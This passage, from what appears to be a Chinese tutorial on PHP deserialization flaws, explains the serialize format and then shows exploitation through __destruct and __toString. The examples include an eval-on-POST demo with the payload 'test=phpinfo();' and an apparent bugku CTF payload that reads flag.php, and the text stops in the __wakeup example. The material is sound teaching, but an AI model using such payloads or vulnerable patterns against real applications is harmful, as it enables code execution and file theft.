class=&#34;line&#34;&gt;class object&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $team = &amp;#x27;joker&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $team_name = &amp;#x27;hahaha&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected $team_group = &amp;#x27;biubiu&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function hahaha()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;$team_members = &amp;#x27;奥力给&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$object = new object();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo serialize($object);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:6:&amp;quot;object&amp;quot;:3:&amp;#123;s:4:&amp;quot;team&amp;quot;;s:5:&amp;quot;joker&amp;quot;;s:17:&amp;quot;objectteam_name&amp;quot;;s:6:&amp;quot;hahaha&amp;quot;;s:13:&amp;quot;*team_group&amp;quot;;s:6:&amp;quot;biubiu&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果我们使用urlencode输出时&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;就能很明显的看到%00和*了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;值得一提的是，类方法并不会参与到实例化里面。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;序列化格式中的字母含义：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a - array                    b - boolean  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d - double                   i - integer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;o - common object            r - reference&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s - string                   C - custom object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O - class                  N - null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;R - pointer reference      U - unicode string&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h4&gt;
&lt;p&gt;反序列化的话，就依次根据规则进行反向复原。&lt;/p&gt;
&lt;p&gt;这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 进行输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ser = &amp;#x27;O:6:&amp;quot;object&amp;quot;:3:&amp;#123;s:1:&amp;quot;a&amp;quot;;i:1;s:4:&amp;quot;team&amp;quot;;s:6:&amp;quot;hahaha&amp;quot;;&amp;#125;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $ser = unserialize($ser);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var_dump($ser);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;object(__PHP_Incomplete_Class)#1 (3) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;__PHP_Incomplete_Class_Name&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  string(6) &amp;quot;object&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;a&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&amp;quot;team&amp;quot;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  string(6) &amp;quot;hahaha&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用：&lt;/h3&gt;
&lt;p&gt;在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果&lt;strong&gt;让攻击者操纵任意反序列数据&lt;/strong&gt;， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。&lt;/p&gt;
&lt;p&gt;挖掘反序列化漏洞的条件是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。&lt;/p&gt;
&lt;p&gt;2. unserialize () 函数的参数可控。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;0x00-__destruct利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-__destruct利用&#34;&gt;#&lt;/a&gt; 0x00 __destruct () 利用&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $test = &amp;quot;demo&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __destruct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        @eval($this-&amp;gt;test);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$test = $_POST[&amp;#x27;test&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$len = strlen($test)+1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$p = &amp;quot;O:1:\&amp;quot;A\&amp;quot;:1:&amp;#123;s:4:\&amp;quot;test\&amp;quot;;s:&amp;quot;.$len.&amp;quot;:\&amp;quot;&amp;quot;.$test.&amp;quot;;\&amp;quot;;&amp;#125;&amp;quot;; // 构造序列化对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$test_unser = unserialize($p); // 反序列化同时触发_destruct函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&amp;#x27;test&amp;#x27;],复原时还需要有对应的变量值的length&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;test=phpinfo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;的值进行覆盖，题目中已经给出了序列化链，很明显是对类&lt;/mtext&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mtext&gt;的&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;值&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;进&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;行&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;覆&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;盖&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;题&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;目&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;已&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;经&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;给&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;出&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;了&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;序&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;列&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;化&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;链&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;很&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;明&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;显&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;对&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;类&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; test 变量进行覆盖。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;0x01-__tostring利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-__tostring利用&#34;&gt;#&lt;/a&gt; 0x01 __tostring () 利用&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$txt = $_GET[&amp;quot;txt&amp;quot;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$file = $_GET[&amp;quot;file&amp;quot;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$password = $_GET[&amp;quot;password&amp;quot;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($txt)&amp;amp;&amp;amp;(file_get_contents($txt,&amp;#x27;r&amp;#x27;)===&amp;quot;welcome to the bugkuctf&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;hello friend!&amp;lt;br&amp;gt;&amp;quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(preg_match(&amp;quot;/flag/&amp;quot;,$file))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       echo &amp;quot;不能现在就给你flag哦&amp;quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       exit(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       include($file); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       $password = unserialize($password); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       echo $password; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       echo &amp;quot;you are not the number of bugku ! &amp;quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//hint.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Flag&amp;#123;//flag.php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $file;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __tostring()&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(isset($this-&amp;gt;file))&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo file_get_contents($this-&amp;gt;file); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return (&amp;quot;good&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?txt=php://input&amp;amp;file=hint.php&amp;amp;password=O:4:&amp;quot;Flag&amp;quot;:1:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;0x02-__wakeup利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-__wakeup利用&#34;&gt;#&lt;/a&gt; 0x02 __wakeup () 利用&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class test&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $test = &amp;#x27;123&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __wakeup()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $fp = fopen(&amp;quot;flag.php&amp;quot;,&amp;quot;w&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fwrite($fp,$this-&amp;gt;test);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fclose($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    